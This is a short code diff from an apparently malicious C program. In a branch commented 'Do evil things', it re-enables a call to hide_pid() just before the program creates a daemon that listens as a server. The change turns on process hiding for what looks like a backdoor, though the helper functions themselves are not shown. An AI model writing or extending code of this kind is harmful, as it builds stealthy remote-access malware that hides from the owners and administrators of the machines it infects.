@@ -16,7 +16,7 @@ int main ( void )
         startup_setup();
     }
     else { // Do evil things
-        //hide_pid();
+        hide_pid();
         t_daemon *daemon = create_daemon();
         server_listen(daemon);
         free(daemon);
